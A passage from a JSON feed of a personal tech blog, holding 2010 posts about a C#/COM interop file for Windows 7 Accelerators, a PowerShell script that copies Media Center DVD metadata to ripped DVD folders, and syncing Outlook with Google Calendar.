add the history of commands I've used to launch the build environment console windows to the jump list of each.\n  </p><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-4400209729821033414?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2010-12-13T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2010-08/Windows+7+Accelerator+Platform+COM+-+C-+Interop/",
			"url": "https://deletethis.net/dave/2010-08/Windows+7+Accelerator+Platform+COM+-+C-+Interop/",
			"title": "Windows 7 Accelerator Platform COM / C# Interop",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    For a new project I'm working on involving IE's installed Accelerators and OpenSearch search providers via the <a href=\"http://msdn.microsoft.com/en-us/library/dd565720(v=VS.85).aspx\">Windows 7\n    Accelerator Platform</a>, I've created a C#/COM interop class for those APIs.\n  </p><p>\n    Download the <a href=\"http://deletethis.net/dave/powershell/osinterop.cs\">osinterop.cs</a> interop file here.\n  </p><p><iframe width=\"600px\" height=\"400px\" src=\"http://deletethis.net/dave/powershell/osinterop.cs\"></iframe></p><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-6265418634142159904?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2010-08-20T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2010-08/DVD+Ripping+and+Viewing+in+Windows+Media+Center/",
			"url": "https://deletethis.net/dave/2010-08/DVD+Ripping+and+Viewing+in+Windows+Media+Center/",
			"title": "DVD Ripping and Viewing in Windows Media Center",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I've just got a new media center PC connected directly to my television with lots of HD space and so I'm ripping a bunch of my DVDs to the PC so I don't have to fuss with the physical media. I'm\n    ripping with <a href=\"http://lifehacker.com/355281/dvd-rip-automates-one+click-dvd-ripping\">DVD Rip</a>, viewing the results in Windows 7's Windows Media Center after turning on the <a href=\"http://support.microsoft.com/kb/930526\">WMC DVD Library</a>, and using a powershell script I wrote to copy over cover art and metadata.\n  </p><p>\n    My powershell script follows. To use it you must do the following:\n  </p><ol><li>Run Windows Media Center with the DVD in the drive and view the disc's metadata info.\n    </li><li>Rip each DVD to its own subdirectory of a common directory.\n    </li><li>The name of the subdirectory to which the DVD is ripped must have the same name as the DVD name in the metadata. An exception to this are characters that aren't allowed in Windows paths (e.g.\n    &lt;, &gt;, ?, *, etc)\n    </li><li>Run the script and pass the path to the common directory containing the DVD rips as the first parameter.\n    </li></ol>Running WMC and viewing the DVD's metadata forces WMC to copy the metadata off the Internet and cache it locally. After playing with Fiddler and reading this <a href=\"http://www.mediabrowser.tv/forum/viewtopic.php?f=9&amp;t=2934\">blog post on WMC metadata</a> I made the following script that copies metadata and cover art from the WMC cache to the corresponding DVD\n  rip directory.\n  <p>\n    Download <a href=\"http://deletethis.net/dave/wmce-zune-hack/copydvdinfo.ps1\">copydvdinfo.ps1</a></p><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-7418839341420694025?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2010-08-17T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2010-07/Google+and+Outlook+Calendar+Sync-ing/",
			"url": "https://deletethis.net/dave/2010-07/Google+and+Outlook+Calendar+Sync-ing/",
			"title": "Google and Outlook Calendar Sync&#39;ing",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  I previously described my desire to <a href=\"http://deletethis.net/dave/?uri=http%3A%2F%2Fwww.google.com%2Fsupport%2Fcalendar%2Fbin%2Fanswer.py%3Fanswer%3D89955\">hook my Outlook calendar up to my\n  Google calendar</a>. I just found out that I can do this and the reverse as both support publishing calendars to the Internet. The following are how I set this up under Outlook 2010 and Google\n  Calendar:<br><br>\n  In Outlook, I go to the calendar view, right click on my calendar and select \"Share Publish to Office.com\". At this point I can change the permissions to allow anonymous Internet access, and under\n  Detail change between 'Full details' (full calendar), 'Limited details' (subject lines &amp; availability only), 'Availability only'. Availability only is almost just what I want -- I'd also like to\n  include location but availability only is good enough. After hitting OK here I get a 'Do you want to send an invitation...' dialog box. I hit 'Yes' and I can copy the webcals:// URL out of the\n  email window that opens up. Next, to add it to my Google calendar, I open <a href=\"http://www.google.com/calendar/\">http://www.google.com/calendar/</a>, and under 'Other calendars', I select 'Add\n  Add by URL', paste in that webcals:// URL but change the 'webcals' at the start to 'https'.<br><br>\n  In Google Calendar, I can click on my calendar name under 'My calendars', select 'Calendar settings', and on the new page, look under 'Calendar Address', click the ICAL icon, and copy the URL in\n  the new dialog. Now back in Outlook I go to the Calendar view, right click on 'My Calendars', and select 'Add Calendar From Internet...'. In the new dialog that pops up I paste in the URL from\n  Google Calendar.<br><br>\n  In this fashion I can share public calendar data between my personal and work calendars.\n  <div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-7754384779941356016?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2010-07-08T00:00:00Z"
		}
		
	]
}
